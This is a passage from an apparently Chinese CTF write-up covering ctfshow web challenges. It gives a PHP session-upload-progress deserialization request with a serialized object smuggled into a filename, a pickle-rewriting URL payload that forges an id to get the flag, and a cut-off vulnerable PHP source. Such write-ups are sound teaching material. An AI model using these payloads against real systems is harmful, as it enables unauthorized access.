class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h5&gt;Welecome "</span> <span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">", now you win "</span> <span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'win'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" rounds.&lt;/h5&gt;"</span><span class="token punctuation">;</span><span class="token variable">$Game</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">&gt;</span></span>Make your choice :<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Rock<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>choice<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token entity" title="✌">&amp;#9996;</span><span class="token entity" title="🏻">&amp;#127995;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Paper<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>choice<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token entity" title="✊">&amp;#9994;</span><span class="token entity" title="🏻">&amp;#127995;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Scissors<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>choice<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token entity" title="✋">&amp;#9995;</span><span class="token entity" title="🏻">&amp;#127995;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$choices</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Rock"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Paper"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Scissors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rand_bot</span> <span class="token operator">=</span> <span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token variable">$choices</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$bot_input</span> <span class="token operator">=</span> <span class="token variable">$choices</span><span class="token punctuation">[</span><span class="token variable">$rand_bot</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$choices</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$user_input</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$Game</span><span class="token operator">-&gt;</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token variable">$user_input</span><span class="token punctuation">,</span> <span class="token variable">$bot_input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"You Win"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'win'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'win'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token delimiter important">?&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flag<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flag<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flag<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>get flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>source<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>source<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>source<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>show source<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'win'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div&gt;You need to win 100 rounds in a row to get flag.&lt;/div&gt;"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Here is your flag:"</span> <span class="token operator">.</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开头使用 ini_set 修改 session 序列化引擎</p><p><img src="/../../../pic/Pasted%20image%2020221017113239.png"></p><p>查看 phpinfo 获取到没有配置 session 自动删除，使用PHP_SESSION_UPLOAD_PROGRESS 进行 session 反序列化</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Apifox/1.0.0 (https://www.apifox.cn)</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">ab49ef47-a3d5-4afa-8e69-337c14bbdf94.challenge.ctf.show</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=--------------------------028457913396521751531736</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=2333</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">390</span></span>----------------------------028457913396521751531736<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="PHP_SESSION_UPLOAD_PROGRESS"</span></span>2333----------------------------028457913396521751531736<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename="|O:4:\"Game\":1:{s:3:\"log\";s:22:\"/var/www/html/flag.php\";}"</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain</span></span><span class="token text-plain">----------------------------028457913396521751531736--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221017114716.png"></p><h3 id="3-baby-pickle"><a href="#3-baby-pickle" class="headerlink" title="3. baby_pickle"></a>3. baby_pickle</h3><p>题目附件给出了源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Author:</span><span class="token comment">#   Achilles</span><span class="token comment"># Time:</span><span class="token comment">#   2022-9-20</span><span class="token comment"># For:</span><span class="token comment">#   ctfshow</span><span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token punctuation">,</span> pickletools<span class="token keyword">import</span> uuid<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow{"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"}"</span><span class="token keyword">class</span> <span class="token class-name">Rookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">id</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">agent_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> <span class="token builtin">id</span>    <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">id</span> <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> <span class="token string">"new_rookie"</span>    new_rookie <span class="token operator">=</span> Rookie<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>        info <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>new_rookie<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        info <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>info<span class="token punctuation">)</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"error"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    message <span class="token operator">=</span> <span class="token string">"&lt;h1&gt;欢迎来到新手村"</span> <span class="token operator">+</span> user<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"&lt;/h1&gt;\n&lt;p&gt;"</span> <span class="token operator">+</span> <span class="token string">"只有成为大菜鸡才能得到flag"</span> <span class="token operator">+</span> <span class="token string">"&lt;/p&gt;"</span>    <span class="token keyword">return</span> message<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/dacaiji"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">if</span> user<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        message <span class="token operator">=</span> <span class="token string">"&lt;h1&gt;你不是大菜鸡&lt;/h1&gt;"</span>        <span class="token keyword">return</span> message    <span class="token keyword">else</span><span class="token punctuation">:</span>        message <span class="token operator">=</span> <span class="token string">"&lt;h1&gt;恭喜你成为大菜鸡&lt;/h1&gt;\n&lt;p&gt;"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">"&lt;/p&gt;"</span>        <span class="token keyword">return</span> message<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/change"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    newname <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"newname"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>    info <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"old_info ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"name ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"newname ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>newname<span class="token punctuation">)</span>    info <span class="token operator">=</span> info<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>name<span class="token punctuation">,</span> newname<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到使用 pickle 序列化用户信息后进行存储，在 change 中可以修改内容，利用该点实现逃逸</p><p>写个脚本看一下差异</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">Rookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">id</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>Rookie<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>Rookie<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">b'ccopy_reg\n_reconstructor\np0\n(c__main__\nRookie\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVadmin\np7\nsVid\np8\nI0\nsb.'</span><span class="token string">b'ccopy_reg\n_reconstructor\np0\n(c__main__\nRookie\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVadmin\np7\nsVid\np8\nI1\nsb.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>很简单，覆盖即可</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">/?name=admin/change?name=YWRtaW4%3D&amp;newname=YWRtaW4Kc1ZpZApJMApzYi4%3D/dacaiji?name=admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-repairman"><a href="#4-repairman" class="headerlink" title="4. repairman"></a>4. repairman</h3><p>将 mode 的值修改为 0 获得源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$secret</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token constant">Null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your mode is the guest!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">cmd</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Sucess change the ini!The logs record you!'</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$secret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token variable">$secret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string 